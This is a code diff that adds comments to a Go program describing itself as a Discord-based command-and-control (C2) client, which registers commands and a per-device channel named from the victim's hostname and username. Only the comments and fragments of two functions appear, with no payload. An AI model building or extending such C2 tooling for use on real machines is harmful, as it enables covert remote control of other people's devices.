@@ -1,5 +1,8 @@
 package main
 
+// This file boots the Discord C2 client, registers slash commands for this
+// device, and connects to a per-device text channel.
+
 import (
 	"fmt"
 	"log"
@@ -16,6 +19,8 @@ import (
 	"github.com/bwmarrin/discordgo"
 )
 
+// main starts the Discord session, ensures commands and the device channel
+// exist, posts an initial banner message, and then blocks until shutdown.
 func main() {
 	loadEnvFile(".env")
 	guildID = os.Getenv("DISCORD_GUILD_ID")
@@ -371,6 +376,8 @@ func main() {
 	dg.Close()
 }
 
+// makeChannelName derives a Discord channel name from hostname and username,
+// normalizing invalid characters and limiting the length.
 func makeChannelName(hostname, username string) string {
 	base := strings.ToLower(hostname + "-" + username)
 	var b strings.Builder
